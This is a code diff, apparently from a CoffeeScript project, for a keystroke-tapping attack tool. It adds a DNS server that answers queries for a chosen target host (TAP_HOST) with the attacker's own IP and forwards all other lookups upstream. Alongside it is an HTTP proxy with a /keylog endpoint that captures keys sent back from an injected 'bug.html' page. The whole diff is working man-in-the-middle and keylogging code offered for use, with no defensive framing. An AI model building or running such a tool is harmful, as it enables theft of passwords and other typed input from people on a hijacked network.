@@ -5,6 +5,21 @@ dns = require 'native-dns'
 
 bug = fs.readFileSync 'bug.html'
 
+HTTP_PORT = 80
+DNS_PORT = 53
+DNS_TIMEOUT = 1000
+DNS_TTL = 60
+
+ENV_VARS =
+  PUBLIC_IP:    'The public IP of this server'
+  TAP_HOST:     'The hostname of the site for which you want to tap keystrokes'
+  UPSTREAM_DNS: 'A DNS server to use for non-tapped hostnames'
+
+for param, desc of ENV_VARS
+  if not process.env[param]
+    console.log "The environment variable #{param} (#{desc}) must be set."
+    process.exit()
+
 server = httpProxy.createServer (req, res, proxy) ->
   if /^\/keylog/.exec(req.url)
     key = /key=(.)/.exec(req.url)?[1]
@@ -32,23 +47,31 @@ server = httpProxy.createServer (req, res, proxy) ->
 
   proxy.proxyRequest req, res,
     host: req.headers['host']
-    port: 80
+    port: HTTP_PORT
 
-server.listen 80
+server.listen HTTP_PORT
 
 handleRequest = (req, res) ->
-  console.log req
-
-handleError = (error) ->
-  console.log error
+  if req.question[0].name == process.env.TAP_HOST
+    res.answer.push dns.A
+      name: req.question[0].name
+      address: process.env.PUBLIC_IP
+      ttl: DNS_TTL
+    res.send()
+  else
+    newReq = dns.Request
+      server:
+        address: process.env.UPSTREAM_DNS
+        port: DNS_PORT
+      question: dns.Question(req.question[0])
+      timeout: DNS_TIMEOUT
+    newReq.on 'message', (err, answer) ->
+      res.answer = res.answer.concat(answer.answer)
+    newReq.on 'end', ->
+      res.send()
+    newReq.send()
 
 dnsServer = dns.createServer()
 dnsServer.on 'request', handleRequest
-dnsServer.on 'error', handleError
-dnsServer.serve 53
-  
-tcpDnsServer = dns.createTCPServer()
-tcpDnsServer.on 'request', handleRequest
-tcpDnsServer.on 'error', handleError
-tcpDnsServer.serve 53
+dnsServer.serve DNS_PORT
 
